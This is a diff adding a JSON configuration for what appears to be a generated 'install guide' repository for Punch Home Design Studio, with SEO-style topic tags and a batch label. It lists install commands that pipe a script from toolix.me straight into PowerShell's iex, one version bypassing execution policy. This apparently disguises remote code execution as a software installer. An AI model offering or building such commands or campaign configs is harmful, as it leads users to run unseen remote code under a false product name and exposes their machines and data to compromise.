@@ -1,0 +1,26 @@
+{
+  "repo": "Punch-Home-Design-Studio-Install-Guide",
+  "product": "Punch Home Design Studio Install Guide",
+  "product_title": "Punch Home Design Studio Install Guide",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "how-to-install-punch-home-design-install",
+    "punch-home-design-install-app",
+    "desktop-software",
+    "repository-readme",
+    "install-guide",
+    "punch-home-design-install-desktop-tool",
+    "punch-home-design-install-windows-tool",
+    "punch-home-design-install",
+    "windows-11",
+    "windows-desktop"
+  ],
+  "site": "toolix.me"
+}
